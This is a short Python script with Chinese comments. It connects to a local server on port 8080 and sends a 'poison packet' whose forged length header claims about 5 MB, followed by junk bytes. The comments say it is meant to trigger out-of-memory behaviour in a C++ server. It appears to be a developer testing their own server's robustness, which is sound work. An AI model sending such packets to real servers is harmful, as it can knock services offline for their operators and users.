import socket
import struct
import time

client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
client .connect(('127.0.0.1',8080))
print("成功连接服务器！")

fake_header = struct.pack('!I', 5242880)

# 随便跟几个字节的垃圾数据
poison_packet = fake_header + b"junk_data"

client.send(poison_packet)
print("恶意 OOM 毒包发送完毕，看看 C++ 的反应！")
time.sleep(2)
client.close()